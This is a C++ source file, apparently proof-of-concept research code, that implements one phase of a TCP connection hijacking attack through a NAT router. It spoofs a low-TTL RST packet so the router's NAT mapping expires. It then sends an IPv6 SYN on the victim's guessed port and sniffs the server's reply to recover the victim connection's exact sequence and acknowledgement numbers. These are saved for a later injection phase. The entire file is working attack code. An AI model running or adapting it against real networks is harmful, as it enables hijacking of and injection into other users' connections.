#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <time.h>
#include <set>
#include <map>
#include <thread>
#include <tins/tins.h>
#include <fstream>
using namespace std;
using namespace Tins
;
IPv6Address remote_server_ipv6, attacker_private_ip; 
IPv4Address remote_server_ip, router_wan_ip;
uint16_t remote_server_port;
uint16_t guessed_client_port;
uint32_t exact_seq, exact_ack;
bool seq_got = false;
string packet_iface;
string sniff_filter;
string self_mac_address, router_mac_address;
bool debug = true;

double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}


// Save the seq and ack to file for the third phase to use.
void save_seq_ack_to_file() {
    ofstream fout; 
	fout.open("../complete_attack/SEQ_ACK_RESULT"); 
	fout << "seq: " << exact_seq << endl;
	fout << "ack: " << exact_ack << endl;
	fout.close();
    return;
}

// In this thread, we will get the sequence and acknowledgment numbers of the victim connection.
void get_seq_ack() {
    PacketSender sender;
    NetworkInterface iface(packet_iface); 
	struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);
    while (true){
        IP rst_pkt = IP(router_wan_ip, remote_server_ip) / TCP(guessed_client_port, remote_server_port);
        rst_pkt.rfind_pdu<IP>().ttl(10);
        rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
        rst_pkt.rfind_pdu<TCP>().seq(1);
        sender.send(rst_pkt, iface);
        if(debug) 
            cout << "send rst, will sleep for 13 seconds until the NAT mapping expires." << endl;
        sleep(13);

        // second, send a data packet to the outside server with my own IP address.
        EthernetII pa_pkt = EthernetII(router_mac_address, self_mac_address) / IPv6(remote_server_ipv6, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
        pa_pkt.rfind_pdu<IPv6>().hop_limit(64);
        pa_pkt.rfind_pdu<TCP>().set_flag(TCP::SYN, 1);
        // pa_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
        pa_pkt.rfind_pdu<TCP>().seq(1);
        sender.send(pa_pkt, iface);
        if(debug) 
            cout << "SYN packet sent, wait for the ACK back" << endl;
        // third, wait for the outside server to send the ACK packet with the exact SEQ and ACK back.
        sleep(2);
        if (!seq_got) {
            cout << "Something wrong! You need to debug the code" << endl;
            EthernetII rst_pkt = EthernetII(router_mac_address, self_mac_address) / IPv6(remote_server_ipv6, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
            rst_pkt.rfind_pdu<IPv6>().hop_limit(10);
            rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
            rst_pkt.rfind_pdu<TCP>().seq(2);
            sender.send(rst_pkt, iface);
        } else {
            if(debug) 
                cout << "Received exact SEQ: " << exact_seq << ", Received exact ACK: " << exact_ack << endl;
            save_seq_ack_to_file();
            gettimeofday(&stop_time, NULL);
            if(debug) 
                cout << "Get seq and ack time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;   
            break;
        }
    }
}


// sniff to receive the ACK packet and extract the seq and ack of the ACK.
bool callback(const PDU &pdu) {
    const IPv6 &ip = pdu.rfind_pdu<IPv6>(); 
    const TCP &tcp = pdu.rfind_pdu<TCP>(); 
	if (ip.next_header() == 6 && ip.src_addr() == remote_server_ipv6) {
        if (tcp.sport() == remote_server_port && tcp.dport() == guessed_client_port && (tcp.flags() == TCP::ACK)) {
            exact_seq = tcp.seq();
            exact_ack = tcp.ack_seq();
            seq_got = true;
        }
    }
    return true;
}

void sniff_packets() {
    // Construct the sniffer configuration object
    SnifferConfiguration config;
    config.set_filter(sniff_filter);
	config.set_immediate_mode(true);
    Sniffer(packet_iface, config).sniff_loop(callback);
}

int main(int argc, char** argv)
{
    if (argc != 10) {
        cout << "wrong number of args" << endl;
        return 0;
    }
    attacker_private_ip = IPv6Address(argv[1]);
    guessed_client_port = atoi(argv[2]);
    remote_server_ipv6 = IPv6Address(argv[3]);
    remote_server_ip = IPv4Address(argv[4]);
    remote_server_port = atoi(argv[5]);
    router_wan_ip = IPv4Address(argv[6]);
    packet_iface = argv[7];
    self_mac_address = argv[8];
    router_mac_address = argv[9];

    sniff_filter = "tcp port " + string(argv[5]);

    cout << sniff_filter << endl;
    // start the sniff thread
    thread sniff_thread(sniff_packets);
    
    
    
    // start the main thread to get the SEQ and ACK numbers.
    get_seq_ack();
    sniff_thread.detach();

	return 0;
}
